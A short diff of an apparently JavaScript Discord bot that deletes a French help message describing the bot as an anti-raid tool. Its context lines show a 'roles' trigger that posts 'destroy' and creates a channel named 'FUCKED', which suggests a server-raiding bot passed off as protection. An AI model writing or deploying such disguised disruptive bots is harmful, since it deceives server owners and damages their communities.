@@ -577,9 +577,5 @@ if(message.content === "roles"){
                 message.channel.send("destroy").then(m => m.delete());
                 message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
             }
-            //enléve la chaîne
-            if(message.content.includes("help")){
-                message.channel.send("Voici les commandes du bot :\n help : pour afficher les commandes\n Anti-raid : Pérmet de configurer les anti-raid/spam pour les personnes non-opérateur du serveur.\n Le reste est encore en développement !")
-            }
         });
 client.login(process.env.TOKEN)
